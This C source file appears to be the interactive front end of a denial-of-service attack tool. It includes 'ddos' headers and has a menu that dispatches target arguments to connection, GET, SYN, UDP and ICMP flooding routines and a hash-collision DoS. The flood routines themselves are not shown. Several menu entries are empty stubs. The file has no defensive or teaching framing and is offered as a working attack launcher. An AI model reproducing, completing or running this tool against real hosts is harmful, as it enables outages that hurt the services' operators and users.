#include "header.h"

#include "ddos/get_flood.h"
#include "ddos/icmp_flood.h"
#include "ddos/syn_flood.h"
#include "ddos/udp_flood.h"
#include "ddos/conn_flood.h"
#include "ddos/hash_dos.h"

#define __SIZE_OF_INPUT__ 200
#define __MAX_TOKEN_NUM__ 20

char input[__SIZE_OF_INPUT__];
char *tokens[__MAX_TOKEN_NUM__];

void get_input() {
	printf("$ ");
	fgets(input, __SIZE_OF_INPUT__, stdin);

}
void make_tokens() {
	int i = 0;
	for (i = 0; i < __MAX_TOKEN_NUM__; i++)
		tokens[i] = NULL;
	i = 0;

	tokens[i] = strtok(input, " ");
	while (tokens[i] != NULL) {
		i++;
		tokens[i] = strtok(NULL, " ");
	}

}
int choose_running_type() {
	printf("== Choose Running Type\n");
	printf("== 1. Number Based\n"
			"== 2. Over Time\n");
	printf("== ");
	get_input();
	int t = atoi(input);
	while (t <= 0 || t > 2) {
		printf("Input should be over 0 AND <=2\n");
		get_input();
		t = atoi(input);
	}

	return t;
}

int type_choose_menu() {
	printf("=====================\n");
	printf("1. Header buffering\n"
			"2. Body buffering\n"
			"3. Response buffering\n"
			"4. Connection flooding\n"
			"5. Get flooding\n"
			"6. SYN flooding\n"
			"7. UDP flooding\n"
			"8. ICMP flooding\n"
			"9. Hash Dos\n"
			"10. RefRef\n");

	get_input();
	int t = atoi(input);
	while (t <= 0 || t > 10) {
		printf("Input should be over 0 AND <=10\n");
		get_input();
		t = atoi(input);
	}

	return t;

}

int main(void) {
	int mode;

	while (1) {
		int type = type_choose_menu();

		switch (type) {
		case 1:		//header buffering
			break; 
		case 2:		//body buffering
			break; 
		case 3:		//response buffering
			break; 
		case 4:		//connection flooding
			mode = choose_running_type();
			conn_flood_print_usage(mode);
			get_input();
			make_tokens();
			conn_flood_run(tokens,mode);
			break;
		case 5:		//get flooding
			mode = choose_running_type();
			get_flood_print_usage(mode);
			get_input();
			make_tokens();
			get_flood_run(tokens,mode);
			break; 
		case 6:
			mode = choose_running_type();
			syn_flood_print_usage(mode);
			get_input();
			make_tokens();
			syn_flood_run(tokens, mode);
			break;
		case 7:		//UDP flooding
			udp_flood_print_usage();
			get_input();
			make_tokens();
			udp_flood_run(tokens);
			break; 
		case 8:		//ICMP flooding
			mode = choose_running_type();
			icmp_flood_print_usage(mode);
			get_input();
			make_tokens();
			icmp_flood_run(tokens, mode);
			break; 
		case 9:		//Hash Dos
			hash_dos_print_usage();
			get_input();
			make_tokens();
			hash_dos_run(tokens);
			break;
		case 10:	//Ref Ref
			break;

		}

	}
}
